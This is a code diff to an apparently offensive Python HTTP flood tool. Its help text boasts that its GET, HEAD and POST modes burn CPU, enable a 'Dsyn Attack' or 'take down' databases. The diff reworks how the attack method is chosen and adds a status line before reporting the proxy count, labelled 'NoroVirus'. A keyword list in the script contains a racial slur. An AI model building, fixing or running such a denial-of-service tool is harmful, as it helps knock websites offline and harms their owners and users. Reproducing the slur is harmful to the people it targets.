@@ -10,6 +10,7 @@ except:
 
 useragents = []
 string = ["id","q","a","s","page","result","search","login","user","nigga","Noro","hiv","covid","h1n1"]
+attack_type = ""
 sslmode = False
 new_host = ""
 brute = False
@@ -247,9 +248,9 @@ if len(sys.argv) < 4:
         print(" --ssl    | Enable TLS/SSL Proxy")
         print(" --brute  | Launch Brute Mode")
         print("\nAttack Request Method Can Be Change Like:\n")
-        print(" --method=GET   |  GET Method Can Cost Lots Of CPU Usage")
-        print(" --method=HEAD  |  HEAD Method Can Enable Dsyn Attack")
-        print(" --method=POST  |  POST Method Easy Take Down Database\n")
+        print(" --GET   |  GET Method Can Cost Lots Of CPU Usage")
+        print(" --HEAD  |  HEAD Method Can Enable Dsyn Attack")
+        print(" --POST  |  POST Method Easy Take Down Database\n")
     sys.exit()
 
 if "--help" in sys.argv:
@@ -290,13 +291,14 @@ if sslmode == True:
 else:
     url = "http://" + host + path
 
-if "--method=GET" and "--method=POST" not in sys.argv:
+if "--GET" in sys.argv:
+    attack_type = "GET"
+
+if "--HEAD" in sys.argv:
     attack_type = "HEAD"
-else:
-    if "--method=GET" in sys.argv:
-        attack_type = "GET"
-    else:
-        attack_type = "POST"
+
+if "--POST" in sys.argv:
+    attack_type = "POST"
 
 if "--brute" in sys.argv:
     brute = True
@@ -342,6 +344,8 @@ if brute ==True:
     print("Brute Mode [Enable]")
 else:
     print("Brute Mode [Disable]")
+time.sleep(1)
+print(" \nRequests Method Set As => %s "%(attack_type))
 time.sleep(1)
 print("Total NoroVirus => %s \n"%(len(proxies)))
 
